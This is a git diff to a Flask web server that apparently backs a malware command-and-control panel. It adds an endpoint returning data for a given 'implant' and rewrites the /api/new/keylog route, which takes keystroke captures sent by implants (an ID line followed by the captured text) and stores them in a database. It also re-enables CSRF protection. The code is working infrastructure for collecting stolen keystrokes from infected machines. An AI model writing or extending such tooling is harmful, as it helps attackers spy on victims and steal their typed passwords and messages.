@@ -11,6 +11,7 @@ from flask_login import (
 from flask_wtf.csrf import CSRFProtect, generate_csrf
 from flask_cors import CORS
 from db import Database
+import json
 
 db = Database()
 db.start_db()
@@ -35,7 +36,7 @@ login_manager.init_app(app)
 login_manager.session_protection = "strong"
 
 # Enable CSRF protection
-# csrf = CSRFProtect(app)
+csrf = CSRFProtect(app)
 
 # Dummy user database (replace with a real database in production)
 users = [
@@ -59,6 +60,11 @@ def csrf_token():
 def implants():
     return jsonify(db.get_all_implants())
 
+@app.route("/api/implant", methods=["POST"])
+def implant():
+    data = request.json
+    print(data)
+    return jsonify(db.get_implant(data["implantId"]))
 
 # User class for Flask-Login
 class User(UserMixin):
@@ -144,10 +150,14 @@ def new_implant():
     
 @app.route("/api/new/keylog", methods=["POST"])
 def new_keylog():
-    data = request.json
-    text = data.get("text")
-    implantid = int(data.get("implantid"))
-    return jsonify(db.new_keylog(text, implantid))
+    data = request.data.decode()
+    data = data.split("\n")
+    id_json = json.loads(data.pop(0))
+    implant_id = int(id_json["id"])
+    text = " ".join(data)
+    print(f"Putting data into implant id {implant_id}")
+    print(f"{text}")
+    return jsonify(db.new_keylog(text, implant_id))
 
 if __name__ == "__main__":
     app.run(debug=True)
